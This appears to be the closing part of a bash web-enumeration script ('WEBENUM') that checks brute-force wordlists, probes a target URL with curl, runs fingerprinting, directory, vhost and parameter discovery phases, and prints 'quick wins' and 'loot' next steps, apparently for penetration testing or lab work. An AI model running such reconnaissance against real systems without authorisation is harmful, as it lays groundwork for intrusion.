for wl in "$WL_DIR_FAST" "$WL_DIR_MEDIUM" "$WL_DIR_LARGE" "$WL_FILES_MEDIUM" "$WL_VHOSTS" "$WL_PARAMS"; do
    if [[ -f "$wl" ]]; then
        local_count=$(wc -l < "$wl" 2>/dev/null || echo "?")
        echo -e "  ${GREEN}✓${NC} $(basename "$wl") (${local_count} lines)"
    else
        echo -e "  ${YELLOW}✗${NC} $(basename "$wl") — not found"
    fi
done

echo ""

# --- Connectivity pre-flight ---
info "Checking target connectivity..."
HTTP_CHECK_CODE=$(timeout 10 curl -sk -o /dev/null -w "%{http_code}" \
    -A "Mozilla/5.0 (X11; Linux x86_64)" \
    "$TARGET_URL" 2>/dev/null || echo "000")
HTTP_CHECK_SIZE=$(timeout 10 curl -sk -o /dev/null -w "%{size_download}" \
    -A "Mozilla/5.0 (X11; Linux x86_64)" \
    "$TARGET_URL" 2>/dev/null || echo "0")

if [[ "$HTTP_CHECK_CODE" == "000" ]]; then
    error "Target $TARGET_URL is NOT responding (connection failed)"
    error "Check: Is the target up? Is your VPN connected? Is the URL correct?"
    error "  Try: curl -sk $TARGET_URL"
    echo ""
    warn "Proceeding anyway — some phases may fail..."
elif [[ "$HTTP_CHECK_CODE" =~ ^[45] ]]; then
    warn "Target responded with HTTP $HTTP_CHECK_CODE (${HTTP_CHECK_SIZE} bytes)"
    warn "This may be normal (custom error page) or indicate the wrong URL"
    success "Target is reachable — proceeding"
else
    success "Target responded: HTTP $HTTP_CHECK_CODE (${HTTP_CHECK_SIZE} bytes) — good to go"
fi
echo ""

#==============================================================================
# MAIN EXECUTION
#==============================================================================
START_TIME=$(date +%s)

phase_fingerprint "$TARGET_URL" "$OUTPUT_DIR"
phase_content     "$TARGET_URL" "$OUTPUT_DIR"
phase_recursive   "$TARGET_URL" "$OUTPUT_DIR"
phase_vhosts      "$TARGET_URL" "$OUTPUT_DIR"
phase_params      "$TARGET_URL" "$OUTPUT_DIR"

wait_all

generate_summary  "$TARGET_URL" "$OUTPUT_DIR"

END_TIME=$(date +%s)
ELAPSED=$(( END_TIME - START_TIME ))
MINUTES=$(( ELAPSED / 60 ))
SECS=$(( ELAPSED % 60 ))

header "WEBENUM COMPLETE"
echo ""
success "Total time: ${MINUTES}m ${SECS}s"
success "Results:    ${OUTPUT_DIR}/summary/summary.md"
success "Text copy:  ${OUTPUT_DIR}/summary/summary.txt"
echo ""
echo -e "${BOLD}Quick wins:${NC}"
cat "${OUTPUT_DIR}/summary/quick_wins.txt" 2>/dev/null | grep -v '^#\|^$' | \
    while IFS= read -r line; do
        echo -e "  ${GREEN}★${NC} $line"
    done
echo ""
echo -e "${BOLD}Grounded next steps:${NC}"
if is_nonempty_file "${OUTPUT_DIR}/loot/next_steps.txt"; then
    awk '
        /^## / {shown++; if (shown > 3) exit}
        shown > 0 && !/^# Finding-Driven/ && !/^# Generated/ && !/^# Commands below/ {print "  " $0}
    ' "${OUTPUT_DIR}/loot/next_steps.txt"
else
    echo "  (no grounded web next-step commands generated)"
fi
echo ""
